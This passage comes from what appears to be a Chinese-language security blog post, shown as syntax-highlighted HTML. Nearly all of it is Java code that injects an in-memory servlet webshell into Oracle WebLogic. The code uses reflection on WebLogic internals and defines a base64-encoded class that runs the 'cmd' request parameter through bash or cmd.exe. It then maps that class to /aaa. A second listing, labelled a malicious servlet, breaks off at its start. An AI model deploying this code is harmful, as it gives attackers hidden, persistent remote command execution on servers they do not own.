</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">com.example.web</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sun.misc.BASE64Decoder</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">weblogic.servlet.internal.ServletRequestImpl</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">weblogic.servlet.internal.ServletStubImpl</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">weblogic.servlet.internal.WebAppServletContext</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">weblogic.servlet.utils.ServletMapping</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServlet</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">guguServlet</span> <span class="kd">extends</span> <span class="n">HttpServlet</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">URI</span> <span class="o">=</span> <span class="s">&#34;/aaa&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">           <span class="c1">//获取servletContext
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Thread</span> <span class="n">thread</span> <span class="o">=</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//获取WebAppServletContext
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Field</span> <span class="n">workEntry</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;weblogic.work.ExecuteThread&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;workEntry&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">workEntry</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Object</span> <span class="n">workentry</span> <span class="o">=</span> <span class="n">workEntry</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">thread</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">WebAppServletContext</span> <span class="n">servletContext</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span> <span class="c1">//weblogic 12.1.3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">Field</span> <span class="n">connectionHandler</span> <span class="o">=</span> <span class="n">workentry</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;connectionHandler&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">connectionHandler</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">Object</span> <span class="n">http</span> <span class="o">=</span> <span class="n">connectionHandler</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">workentry</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="n">Field</span> <span class="n">request1</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;request&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">request1</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">ServletRequestImpl</span> <span class="n">servletRequest</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServletRequestImpl</span><span class="o">)</span> <span class="n">request1</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">http</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="n">Field</span> <span class="n">context</span> <span class="o">=</span> <span class="n">servletRequest</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">context</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">servletContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebAppServletContext</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">servletRequest</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">//weblogic 1036
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">Field</span> <span class="n">context</span> <span class="o">=</span> <span class="n">workentry</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">context</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">servletContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebAppServletContext</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">workentry</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// 获取servletMapping
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Method</span> <span class="n">getServletMapping</span> <span class="o">=</span> <span class="n">servletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;getServletMapping&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">getServletMapping</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ServletMapping</span> <span class="n">mappings</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServletMapping</span><span class="o">)</span> <span class="n">getServletMapping</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">servletContext</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ServletStubImpl</span> <span class="n">servletStub</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// 使用ServletStub包装HttpServlet
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">String</span> <span class="n">encode_class</span> <span class="o">=</span> <span class="s">&#34;yv66vgAAADQAhwoAHQBDCAArCwBEAEUIAEYKAEcASAoACQBJCABKCgAJAEsHAEwIAE0IAE4IAE8IAFAKAFEAUgoAUQBTCgBUAFUHAFYKABEAVwgAWAoAEQBZCgARAFoKABEAWwgAXAsAXQBeCgBfAGAKAF8AYQoAXwBiBwBjBwBkAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB1MY29tL2V4YW1wbGUvd2ViL2h0dHBTZXJ2bGV0OwEABWRvR2V0AQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEABHJlc3ABAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQAHaXNMaW51eAEAAVoBAAVvc1R5cAEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACaW4BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAFzAQATTGphdmEvdXRpbC9TY2FubmVyOwEABm91dHB1dAEAA291dAEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEADVN0YWNrTWFwVGFibGUHAEwHADEHAGUHAFYBAApFeGNlcHRpb25zBwBmBwBnAQAKU291cmNlRmlsZQEAEGh0dHBTZXJ2bGV0LmphdmEMAB4AHwcAaAwAaQBqAQAHb3MubmFtZQcAawwAbABqDABtAG4BAAN3aW4MAG8AcAEAEGphdmEvbGFuZy9TdHJpbmcBAARiYXNoAQACLWMBAAdjbWQuZXhlAQACL2MHAHEMAHIAcwwAdAB1BwB2DAB3AHgBABFqYXZhL3V0aWwvU2Nhbm5lcgwAHgB5AQACXGEMAHoAewwAfAB9DAB+AG4BAAAHAH8MAIAAgQcAggwAgwCEDACFAB8MAIYAHwEAG2NvbS9leGFtcGxlL3dlYi9odHRwU2VydmxldAEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldAEAE2phdmEvaW8vSW5wdXRTdHJlYW0BAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAFY2xvc2UAIQAcAB0AAAAAAAIAAQAeAB8AAQAgAAAALwABAAEAAAAFKrcAAbEAAAACACEAAAAGAAEAAAAMACIAAAAMAAEAAAAFACMAJAAAAAQAJQAmAAIAIAAAAYoABAALAAAAoSsSArkAAwIATgQ2BBIEuAAFOgUZBcYAExkFtgAGEge2AAiZAAYDNgQVBJkAGAa9AAlZAxIKU1kEEgtTWQUtU6cAFQa9AAlZAxIMU1kEEg1TWQUtUzoGuAAOGQa2AA+2ABA6B7sAEVkZB7cAEhITtgAUOggZCLYAFZkACxkItgAWpwAFEhc6CSy5ABgBADoKGQoZCbYAGRkKtgAaGQq2ABuxAAAAAwAhAAAAOgAOAAAADwAJABAADAARABMAEgAlABMAKAAVAFYAFgBjABcAcwAYAIcAGQCPABoAlgAbAJsAHACgAB0AIgAAAHAACwAAAKEAIwAkAAAAAAChACcAKAABAAAAoQApACoAAgAJAJgAKwAsAAMADACVAC0ALgAEABMAjgAvACwABQBWAEsAMAAxAAYAYwA+ADIAMwAHAHMALgA0ADUACACHABoANgAsAAkAjwASADcAOAAKADkAAAAhAAX+ACgHADoBBwA6GVEHADv+AC4HADsHADwHAD1BBwA6AD4AAAAGAAIAPwBAAAEAQQAAAAIAQg==&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="kt">byte</span><span class="o">[]</span> <span class="n">decode_class</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BASE64Decoder</span><span class="o">().</span><span class="na">decodeBuffer</span><span class="o">(</span><span class="n">encode_class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Method</span> <span class="n">defineClass</span> <span class="o">=</span> <span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;defineClass&#34;</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">TYPE</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">TYPE</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">defineClass</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//这里为了适配weblogic 1036 必须反射获取webAppServletContext中的classLoader
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Field</span> <span class="n">loader</span> <span class="o">=</span> <span class="n">servletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;classLoader&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">loader</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ClassLoader</span> <span class="n">ClassLoader0</span> <span class="o">=</span> <span class="o">(</span><span class="n">ClassLoader</span><span class="o">)</span> <span class="n">loader</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">servletContext</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Class</span> <span class="n">servlet_class</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">)</span> <span class="n">defineClass</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">ClassLoader0</span><span class="o">,</span> <span class="n">decode_class</span><span class="o">,</span> <span class="n">0</span><span class="o">,</span> <span class="n">decode_class</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">//获取ChangeAwareClassLoader，因为cachedClasses这个变量在ChangeAwareClassLoader中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Field</span> <span class="n">classLoader</span> <span class="o">=</span> <span class="n">servletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;classLoader&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">classLoader</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ClassLoader</span> <span class="n">classLoader1</span> <span class="o">=</span> <span class="o">(</span><span class="n">ClassLoader</span><span class="o">)</span> <span class="n">classLoader</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">servletContext</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//获取cachedClasses
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Field</span> <span class="n">cachedClasses</span> <span class="o">=</span> <span class="n">classLoader1</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;cachedClasses&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">cachedClasses</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Object</span> <span class="n">cachedClasses_map</span> <span class="o">=</span> <span class="n">cachedClasses</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">classLoader1</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Method</span> <span class="n">get</span> <span class="o">=</span> <span class="n">cachedClasses_map</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;get&#34;</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">get</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//把cmdServlet的class存入cachedClasses中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Method</span> <span class="n">put</span> <span class="o">=</span> <span class="n">cachedClasses_map</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;put&#34;</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">put</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">put</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">cachedClasses_map</span><span class="o">,</span> <span class="s">&#34;cmdServlet&#34;</span><span class="o">,</span> <span class="n">servlet_class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">ServletStubImplConstructor</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;weblogic.servlet.internal.ServletStubImpl&#34;</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">WebAppServletContext</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">ServletStubImplConstructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">servletStub</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServletStubImpl</span><span class="o">)</span> <span class="n">ServletStubImplConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">URI</span><span class="o">,</span> <span class="s">&#34;cmdServlet&#34;</span><span class="o">,</span> <span class="n">servletContext</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">ServletStubImplConstructor</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;weblogic.servlet.internal.ServletStubImpl&#34;</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">WebAppServletContext</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">ServletStubImplConstructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">servletStub</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServletStubImpl</span><span class="o">)</span> <span class="n">ServletStubImplConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">URI</span><span class="o">,</span> <span class="s">&#34;cmdServlet&#34;</span><span class="o">,</span> <span class="n">servletContext</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// 使用URLMathchHelper包装ServletStub
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">URLMatchHelperConstructor</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;weblogic.servlet.internal.URLMatchHelper&#34;</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">ServletStubImpl</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">URLMatchHelperConstructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Object</span> <span class="n">umh</span> <span class="o">=</span> <span class="n">URLMatchHelperConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">URI</span><span class="o">,</span> <span class="n">servletStub</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// 添加到ServletMapping中，即代表注入servlet内存马成功
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="o">(</span><span class="n">mappings</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">URI</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">mappings</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">URI</span><span class="o">,</span> <span class="n">umh</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;success&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span><span class="k">else</span><span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;already exist&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>恶意Servlet</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">com.example.web</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.servlet.ServletException</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServlet</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.PrintWriter</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.Scanner</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">httpServlet</span> <span class="kd">extends</span> <span class="n">HttpServlet</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
